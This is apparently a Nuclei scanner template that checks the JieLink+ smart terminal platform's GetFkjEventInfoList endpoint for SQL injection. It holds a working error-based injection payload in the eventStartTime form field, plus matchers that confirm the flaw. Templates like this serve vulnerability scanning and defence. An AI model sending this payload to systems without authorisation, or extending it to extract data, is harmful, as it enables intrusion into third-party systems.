id: JieLink-GetFkjEventInfoList-sql

info:
  name: JieLink+智能终端操作平台 GetFkjEventInfoList SQL注入漏洞
  author: JieLink
  severity: high
  tags: JieLink

http:
  - raw:
      - |
        POST /report/fkj/GetFkjEventInfoList HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0
        Accept: application/json, text/javascript, */*; q=0.01
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        X-Requested-With: XMLHttpRequest

        eventStartTime=' AND EXTRACTVALUE(4817,CONCAT(0x5c,0x71716b6a71,(SELECT (ELT(4817=4817,1))),0x7176787171)) AND 'qVLu'='qVLu&eventEndTime=&deviceIp=&deviceName=&eventTypeName=&eventContent=&page=1&rows=20

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'XPATH syntax error'
          - 'qqkjq1qvxqq'
        condition: and
